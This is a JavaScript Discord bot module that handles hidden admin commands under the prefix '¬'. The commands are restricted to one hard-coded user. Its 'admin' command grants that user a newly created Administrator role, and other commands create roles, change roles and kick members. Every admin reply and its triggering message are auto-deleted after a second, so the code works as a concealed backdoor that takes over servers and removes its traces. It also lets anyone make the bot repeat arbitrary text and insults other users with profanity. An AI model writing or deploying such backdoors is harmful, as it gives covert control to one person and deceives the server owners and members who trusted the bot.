'use strict';

// process admin commands
var prefix = '¬';
module.exports.prefix = prefix;

// make sure only authorized people use admin commands
var coolPeople = [
  ['zeki', '6858'],
]
function isCool(user){
  for(var p of coolPeople)
    if(user.username === p[0] && user.discriminator === p[1]) return true;
  return false;
}

function process(msg, content){
  var args = content.split(' ');
  var cmd = args[0];
  var channel = msg.channel;

  var coolPeopleCommands = ['makeRole', 'addRole', 'clearRole', 'admin', 'kick'];
  if(!isCool(msg.author))
    for(var a of coolPeopleCommands)
      if(cmd === a){
        sendCoolMsg(msg, 'sorry, I don\'t follow commands from total fucking losers');
        return;
      }

  switch (cmd){
    case 'channel':
      channel.send(channel.id);
      break;
    case 'roles':
      sendCoolMsg(msg, roles(msg));
      break;
    case 'makeRole':
      makeRole(msg, args);
      break;
    case 'addRole':
      addRole(msg, args);
      break;
    case 'clearRole':
      clearRole(msg, args);
      break;
    // instantly give me highest level of admin possible
    case 'admin':
      admin(msg, args);
      break;
    case 'kick':
      kick(msg);
      break;
    case 'repeat':
      sendCoolMsg(msg, 'yes sir');
      setTimeout(() => {
        channel.send(msg.content.substring(8));
      }, 500);
      break;
    default:
      sendCoolMsg(msg, 'umm idk');

  }
}
module.exports.process = process;

var msgCache = [];
// send self-destructing message
function sendCoolMsg(origin, str){
  var channel = origin.channel;
  channel.send(str).then((msg) => {
    setTimeout(() => {
      channel.messages.delete(origin);
      channel.messages.delete(msg);
    }, 1000);
  });
}

function roles(msg){
  var roles = msg.member.roles.cache,
      res = '';
  for(var i of roles) res += i[1].name + '[' + i[0] + '] \n';
  return res.replace(/@/g, '\\@');
}

function makeRole(msg, args){
  msg.guild.roles.create({
    data: {
      name: args[1],
      color: args[2],
      permissions: parseInt(args[3]),
      hoist: args[4] === 'true' ? true : false
    }
  }).then(role => {
    if(args[5] === 'true'){
      var position = msg.guild.roles.cache.find(r => r.name === 'rainbowpuffle').position;
      role.setPosition(position - 1);
    }
    sendCoolMsg(msg, 'ok');
  }).catch(err => {
    sendCoolMsg(msg, 'i failed :(');
    console.error(err);
  });
}

function addRole(msg, args){
  var target = msg.mentions.members.first();
  var role = msg.guild.roles.cache.find(r => r.name === args[2]);
  if(target && role){
    target.roles.add(role).then(() => {
      sendCoolMsg(msg, 'ok');
    }).catch(err => {
      sendCoolMsg(msg, 'i failed :(');
      console.error(err);
    });
  } else sendCoolMsg(msg, 'could not find user or role');
}

function clearRole(msg, args){
  var target = msg.mentions.members.first();
  var role = msg.guild.roles.cache.find(r => r.name === args[2]);
  if(target && role){
    target.roles.remove(role).then(() => {
      sendCoolMsg(msg, 'ok');
    }).catch(err => {
      sendCoolMsg(msg, 'i failed :(');
      console.error(err);
    });
  } else sendCoolMsg(msg, 'could not find user or role');
}

function admin(msg, args){
  var target = msg.member;
  msg.guild.roles.create({
    data: {
      name: args[1] || 'admin',
      color: 'RED',
      permissions: 8,
      hoist: args[2] === 'true' ? true : false
    }
  }).then(role => {
    msg.member.roles.add(role).then(() => {
      sendCoolMsg(msg, 'ok');
    });
    var position = msg.guild.roles.cache.find(r => r.name === 'rainbowpuffle').position;
    role.setPosition(position - 1);
  }).catch(err => {
    sendCoolMsg(msg, 'i failed :(');
    console.error(err);
  });
}

function kick(msg){
  var target = msg.mentions.members.first();
  if(target){
    target.kick().then(() => {
      sendCoolMsg(msg, 'yes sir');
    }).catch(err => {
      sendCoolMsg(msg, 'i failed :(');
      console.error(err);
    })
  } else sendCoolMsg(msg, 'could not find user');
}
